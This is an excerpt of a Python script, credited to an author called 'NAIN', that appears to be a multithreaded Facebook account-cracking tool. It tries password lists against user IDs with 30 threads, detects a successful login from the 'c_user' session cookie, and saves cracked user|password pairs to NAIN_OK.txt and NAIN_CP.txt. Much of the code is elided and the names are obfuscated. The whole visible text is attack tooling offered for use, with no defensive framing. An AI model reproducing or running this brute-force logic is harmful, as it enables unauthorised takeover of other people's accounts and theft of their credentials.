...
from concurrent.futures import ThreadPoolExecutor as NAINssb
...
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m NAIN
\033[1;31m\033[1;37m Facebook\x1b[1;97m :  \033[1;37 TH3 CH3RRY
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m NAIN X3 SUMMY X3 TIGER 
\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m 1.3.6
\033[1;37m------------------------\033[1;37m------------------------ """                                              
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[NAIN] {loop}|{len(self.id)} [OK][{len(ok)}] [CP][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [NAIN-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('NAIN_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [NAIN-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('NAIN_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with NAINssb(max_workers=30) as ssbworld:
